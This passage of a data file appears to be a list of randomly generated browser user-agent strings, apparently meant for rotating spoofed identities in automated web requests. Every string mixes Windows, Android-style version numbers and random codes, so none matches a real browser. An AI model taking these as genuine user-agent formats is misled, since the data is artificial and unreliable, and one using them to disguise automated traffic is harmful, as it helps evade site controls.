'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)I701U) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4791.40 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)E786K) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4742.41 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)L580Z) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4796.106 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Z338U) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4787.68 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)D790G) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4543.136 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A817V) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4493.121 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Z96J) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4326.76 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)F134D) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4489.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)E520F) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4692.54 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)N190E) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4579.148 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)T243T) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4582.66 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)M192B) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4449.76 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)M388V) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4698.42 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)R604G) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4481.105 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)W949F) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4856.78 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)W190L) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4866.94 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A68X) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4617.63 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)K789C) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4708.129 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)O217D) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4543.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A875Y) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4533.47 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)H64V) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4268.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)R649A) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4561.95 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)V309L) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4303.133 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)T769C) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4649.129 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)O207X) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4867.83 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)I589E) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4213.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Z350I) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4769.92 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)B36Q) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4238.121 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)G519V) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4512.133 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)L26U) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4442.57 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)G283U) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4806.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)S576N) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4275.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)T500F) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4727.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)I955S) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4808.123 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)V593U) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4255.101 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)P311E) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4461.116 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Y106Z) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4729.133 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)N847A) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4688.137 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)V346D) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4226.140 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)H686O) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4578.124 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)L736R) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4479.54 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)K948C) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4573.82 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)A774O) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4769.96 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)A515E) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4393.94 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)I401Q) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4710.85 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)B678X) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4234.42 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)K778K) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4686.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)H3R) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4668.141 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A182A) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4592.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)L84Y) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4876.139 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)S700L) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4267.133 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)M906R) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4759.108 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H562N) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4454.85 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)B617O) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4500.107 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)T488Q) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4520.129 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)C640D) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4744.121 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Z836C) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4728.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)H968T) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4205.108 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)U605M) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4599.100 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)N17Z) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4793.147 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)R290J) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4269.55 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)C263Q) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4378.48 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)L828U) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4900.128 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)K797H) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4675.119 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Y628S) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4498.110 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Q429E) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4631.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Q902L) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4336.76 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)I516Y) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4425.138 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)N606C) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4421.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)K515B) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4694.98 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)L45C) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4260.55 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)M817A) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4706.69 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)U13T) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4442.127 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)N450Q) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4239.70 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)K275D) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4635.71 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)W687P) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4676.51 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)V420I) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4307.62 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)U778P) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4440.140 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)S522C) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4817.46 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)L96A) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4512.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)F10L) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4409.87 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H64M) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4650.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)J759C) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4261.69 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)C995V) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4819.51 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)E479X) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4855.90 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)T453I) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4302.99 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)M325U) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4867.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)E9D) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4772.54 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)B601F) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4640.122 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)M665F) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4214.145 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)F757T) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4787.140 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)H226B) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4254.129 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)U8P) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4377.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)J623G) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4430.138 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)U473K) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4646.147 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)N363S) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4709.104 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H32D) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4299.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)C37U) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4458.44 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)M155G) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4555.40 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)H173G) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4663.142 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)S934V) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4484.75 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)J672E) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4871.142 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)N178V) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4737.70 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)W984N) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4865.139 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)K156Q) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4248.120 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)G580I) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4374.57 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)L580A) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4722.110 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)F743M) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4437.144 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)L157E) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4438.66 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)X242N) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4510.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)M265O) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4580.65 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)X197F) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4250.103 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)C290Y) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4300.140 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)P614C) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4650.79 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A510A) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4483.61 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)B434V) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4740.110 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)F216G) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4517.49 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)C33O) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4859.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)C485Z) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4516.60 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)S250K) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4459.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)N964I) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4607.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)X326J) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4458.70 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)S83U) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4242.86 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)R39I) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4333.132 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)T751H) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4895.61 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)O778Z) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4645.112 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)V621S) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4812.48 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)V735P) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4794.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)F84B) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4379.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)N117G) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4690.143 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)F105T) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4251.89 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)N737P) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4414.107 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)V409K) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4835.117 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Z952A) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4372.93 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)S621C) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4461.42 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)K355W) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4896.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)T484W) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4664.68 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)U241N) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4485.86 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)G268V) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4277.141 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)G568F) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4333.122 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)W439A) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4276.68 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)D641I) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4513.139 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)V139T) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4280.107 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)F298W) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4654.136 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)F500O) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4419.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)A676W) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4311.104 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)F62W) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4858.65 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)C208V) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4869.101 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)L943A) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4775.46 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)S308L) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4342.77 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)G400X) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4209.89 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)F131T) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4656.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)D821Z) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4274.148 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)E557S) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4519.127 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)F775G) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4789.63 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)U954A) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4592.123 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)G492G) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4329.43 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)F855V) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4509.123 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Y865A) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4775.116 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)K125O) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4631.75 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A994D) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4605.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)J160C) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4272.96 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)J878R) AppleWebKit/537.36 (KHTML, like 